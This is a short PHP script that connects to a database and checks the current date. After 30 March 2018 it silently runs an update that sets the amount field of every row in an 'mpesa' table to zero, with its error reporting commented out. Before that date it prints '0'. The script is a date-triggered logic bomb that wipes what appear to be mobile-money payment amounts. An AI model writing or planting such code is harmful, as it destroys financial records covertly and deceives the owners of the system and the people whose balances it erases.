<?php
include "net2.php";
  $xd=date('Ymd');
   if ($xd>"20180330")
   {
      $sql = "update  mpesa set amt=0";
 //  echo $sql;
$result = mysqli_query($dbi,$sql);  // or die ("no entry " . mysqli_error());
         die (" " );
   
   }else
   {
     echo "0";
   
   }
   
?>